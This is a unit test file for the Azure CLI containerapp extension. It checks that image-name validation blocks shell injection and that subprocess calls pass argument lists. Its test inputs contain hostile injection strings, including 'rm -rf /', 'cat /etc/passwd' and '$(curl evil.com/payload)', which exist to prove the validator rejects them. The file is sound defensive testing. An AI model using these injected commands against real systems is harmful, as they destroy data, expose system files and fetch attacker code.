# --------------------------------------------------------------------------------------------
# Copyright (c) Microsoft Corporation. All rights reserved.
# Licensed under the MIT License. See License.txt in the project root for license information.
# --------------------------------------------------------------------------------------------

import json
import os
import unittest
from unittest import mock

from azure.cli.core.azclierror import ValidationError

from azext_containerapp._utils_validation import validate_image_name


# ---------------------------------------------------------------------------
# Test validate_image_name (now importable directly without deep deps)
# ---------------------------------------------------------------------------


class TestValidateImageName(unittest.TestCase):
    """Tests for validate_image_name() — defense-in-depth against shell metacharacters."""

    def _validate(self, name):
        return validate_image_name(name)

    def test_valid_simple_image(self):
        self._validate("myregistry.azurecr.io/myapp:latest")

    def test_valid_image_with_digest(self):
        self._validate("mcr.microsoft.com/oryx/dotnetcore:7.0.9-debian-bullseye")

    def test_valid_image_with_at_sign(self):
        self._validate("myregistry.azurecr.io/myapp@sha256:abc123")

    def test_valid_image_with_underscores_and_dashes(self):
        self._validate("my-registry.azurecr.io/my_app:v1.2.3-beta")

    def test_rejects_semicolon_injection(self):
        with self.assertRaises(ValidationError):
            self._validate("myimage:latest; rm -rf /")

    def test_rejects_dollar_subshell(self):
        with self.assertRaises(ValidationError):
            self._validate("myimage:$(whoami)")

    def test_rejects_backtick_injection(self):
        with self.assertRaises(ValidationError):
            self._validate("myimage:`whoami`")

    def test_rejects_pipe(self):
        with self.assertRaises(ValidationError):
            self._validate("myimage:latest | cat /etc/passwd")

    def test_rejects_ampersand(self):
        with self.assertRaises(ValidationError):
            self._validate("myimage:latest && echo pwned")

    def test_rejects_empty_string(self):
        with self.assertRaises(ValidationError):
            self._validate("")

    def test_rejects_none(self):
        with self.assertRaises(ValidationError):
            self._validate(None)

    def test_rejects_newline(self):
        with self.assertRaises(ValidationError):
            self._validate("myimage:latest\nwhoami")


# ---------------------------------------------------------------------------
# Test patch_get_image_inspection and patch_cli_call
#
# These functions live in azext_containerapp.custom which has a deep import
# chain that requires the full Azure CLI runtime. We extract just the function
# source to test it in isolation.
# ---------------------------------------------------------------------------

# Minimal namespace that the extracted functions need at runtime
_FUNC_GLOBALS = {
    "subprocess": __import__("subprocess"),
    "json": __import__("json"),
    "logger": mock.MagicMock(),
    "validate_image_name": validate_image_name,
    "update_containerapp": mock.MagicMock(return_value={}),
}


def _extract_function(func_name):
    """Extract a function from custom.py source and compile it in a minimal namespace."""
    import ast
    import textwrap

    src_path = os.path.join(os.path.dirname(__file__), "..", "..", "custom.py")
    src_path = os.path.normpath(src_path)
    with open(src_path, "r", encoding="utf-8") as f:
        source = f.read()
    tree = ast.parse(source, filename=src_path)

    for node in ast.walk(tree):
        if isinstance(node, ast.FunctionDef) and node.name == func_name:
            func_source = ast.get_source_segment(source, node)
            ns = dict(_FUNC_GLOBALS)
            exec(compile(textwrap.dedent(func_source), src_path, "exec"), ns)  # pylint: disable=exec-used
            return ns[func_name]

    raise ValueError(f"Function {func_name!r} not found in {src_path}")


class TestPatchGetImageInspection(unittest.TestCase):
    """Tests that patch_get_image_inspection uses list-based subprocess (no shell=True)."""

    def test_calls_popen_with_list_args(self):
        fn = _extract_function("patch_get_image_inspection")

        mock_process = mock.MagicMock()
        mock_process.communicate.return_value = (
            json.dumps({"remote_info": {"run_images": None}}).encode(),
            b""
        )
        mock_process.__enter__ = mock.MagicMock(return_value=mock_process)
        mock_process.__exit__ = mock.MagicMock(return_value=False)

        img = {
            "imageName": "mcr.microsoft.com/oryx/dotnetcore:7.0.9",
            "targetContainerName": "mycontainer",
            "targetContainerAppName": "myapp",
            "targetContainerAppEnvironmentName": "myenv",
            "targetResourceGroup": "myrg",
        }
        info_list = []
        with mock.patch.dict(_FUNC_GLOBALS, {"subprocess": mock.MagicMock()}):
            _FUNC_GLOBALS["subprocess"].Popen.return_value = mock_process
            # Re-extract with patched globals
            fn = _extract_function("patch_get_image_inspection")
            fn("/usr/local/bin/pack", img, info_list)
            mock_popen = _FUNC_GLOBALS["subprocess"].Popen

        mock_popen.assert_called_once()
        call_args, call_kwargs = mock_popen.call_args
        # First positional arg must be a list (not a string)
        self.assertIsInstance(call_args[0], list)
        self.assertEqual(
            call_args[0],
            ["/usr/local/bin/pack", "inspect-image", "mcr.microsoft.com/oryx/dotnetcore:7.0.9", "--output", "json"],
        )
        # shell=True must NOT be present
        self.assertNotIn("shell", call_kwargs)
        self.assertEqual(len(info_list), 1)

    def test_rejects_malicious_image_name(self):
        fn = _extract_function("patch_get_image_inspection")

        img = {
            "imageName": "malicious; rm -rf /",
            "targetContainerName": "c",
            "targetContainerAppName": "a",
            "targetContainerAppEnvironmentName": "e",
            "targetResourceGroup": "r",
        }
        info_list = []
        with mock.patch.dict(_FUNC_GLOBALS, {"subprocess": mock.MagicMock()}):
            fn = _extract_function("patch_get_image_inspection")
            with self.assertRaises(ValidationError):
                fn("/usr/local/bin/pack", img, info_list)
            # Subprocess should never have been called
            _FUNC_GLOBALS["subprocess"].Popen.assert_not_called()


class TestPatchCliCall(unittest.TestCase):
    """Tests that patch_cli_call uses list-based subprocess (no shell=True)."""

    def test_calls_subprocess_run_with_list_args(self):
        mock_subprocess = mock.MagicMock()
        mock_update = mock.MagicMock(return_value={})

        with mock.patch.dict(_FUNC_GLOBALS, {"subprocess": mock_subprocess, "update_containerapp": mock_update}):
            fn = _extract_function("patch_cli_call")
            fn(
                cmd=mock.MagicMock(),
                resource_group="myrg",
                container_app_name="myapp",
                container_name="mycontainer",
                target_image_name="myregistry.azurecr.io/myapp:old-tag",
                new_run_image="mcr.microsoft.com/oryx/dotnetcore:7.1.0-debian-bullseye",
                pack_exec_path="/usr/local/bin/pack",
            )

        # Verify all 3 subprocess.run calls used list args (not shell strings)
        self.assertEqual(mock_subprocess.run.call_count, 3)
        for call_obj in mock_subprocess.run.call_args_list:
            args = call_obj[0][0]
            self.assertIsInstance(args, list, "subprocess.run must be called with a list, not a string")
            # Verify shell=True was NOT passed
            kwargs = call_obj[1] if len(call_obj) > 1 else {}
            self.assertNotIn("shell", kwargs)

        # Verify the specific commands
        rebase_call = mock_subprocess.run.call_args_list[0]
        self.assertEqual(
            rebase_call[0][0],
            ["/usr/local/bin/pack", "rebase", "-q", "myregistry.azurecr.io/myapp:old-tag",
             "--run-image", "mcr.microsoft.com/oryx/dotnetcore:7.1.0-debian-bullseye", "--force"]
        )

        tag_call = mock_subprocess.run.call_args_list[1]
        self.assertEqual(
            tag_call[0][0],
            ["docker", "tag", "myregistry.azurecr.io/myapp:old-tag",
             "myregistry.azurecr.io/myapp:7.1.0-debian-bullseye"]
        )

        push_call = mock_subprocess.run.call_args_list[2]
        self.assertEqual(
            push_call[0][0],
            ["docker", "push", "-q", "myregistry.azurecr.io/myapp:7.1.0-debian-bullseye"]
        )

    def test_rejects_malicious_target_image_name(self):
        mock_subprocess = mock.MagicMock()

        with mock.patch.dict(_FUNC_GLOBALS, {"subprocess": mock_subprocess}):
            fn = _extract_function("patch_cli_call")
            with self.assertRaises(ValidationError):
                fn(
                    cmd=mock.MagicMock(),
                    resource_group="myrg",
                    container_app_name="myapp",
                    container_name="mycontainer",
                    target_image_name="myimage; rm -rf /",
                    new_run_image="mcr.microsoft.com/oryx/dotnetcore:7.1.0",
                    pack_exec_path="/usr/local/bin/pack",
                )
            mock_subprocess.run.assert_not_called()

    def test_rejects_malicious_new_run_image(self):
        mock_subprocess = mock.MagicMock()

        with mock.patch.dict(_FUNC_GLOBALS, {"subprocess": mock_subprocess}):
            fn = _extract_function("patch_cli_call")
            with self.assertRaises(ValidationError):
                fn(
                    cmd=mock.MagicMock(),
                    resource_group="myrg",
                    container_app_name="myapp",
                    container_name="mycontainer",
                    target_image_name="myregistry.azurecr.io/myapp:v1",
                    new_run_image="$(curl evil.com/payload)",
                    pack_exec_path="/usr/local/bin/pack",
                )
            mock_subprocess.run.assert_not_called()


if __name__ == '__main__':
    unittest.main()
